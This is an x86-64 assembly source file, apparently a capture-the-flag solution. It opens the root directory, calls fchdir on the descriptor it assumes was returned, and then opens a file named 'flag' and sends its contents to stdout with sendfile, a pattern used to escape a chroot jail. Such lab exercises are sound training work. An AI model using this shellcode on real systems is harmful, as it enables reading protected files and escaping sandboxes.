.global _start
.intel_syntax noprefix

_start:
    # Open syscall to get dir_fd for '/'
    lea rdi, [rip + root_path]   # pathname for '/'
    xor rsi, rsi                 # flags (O_RDONLY)
    xor rdx, rdx                 # mode
    mov rax, 0x02                # syscall number for open
    syscall

    # Fchdir syscall to change the directory to '/'
    mov rdi, 3                 # dir_fd for '/'
    mov rax, 0x51                # syscall number for fchdir
    syscall

    # Open syscall to open the flag file
    lea rdi, [rip + flag_path]   # pathname for 'flag'
    xor rsi, rsi                 # flags (O_RDONLY)
    xor rdx, rdx                 # mode
    mov rax, 0x02                # syscall number for open
    syscall

    # Save the flag_fd
    mov r13, rax

    # Sendfile syscall to send the content of the file to stdout
    mov rdi, 1                   # out_fd (stdout)
    mov rsi, r13                 # in_fd (file descriptor returned by open)
    xor rdx, rdx                 # offset
    mov r10, 1000                # count (number of bytes to send)
    mov rax, 0x28                # syscall number for sendfile
    syscall

    # Exit syscall
    xor rdi, rdi                 # exit code
    mov rax, 0x3c                # syscall number for exit
    syscall

root_path:
    .string "/"

flag_path:
    .string "flag"
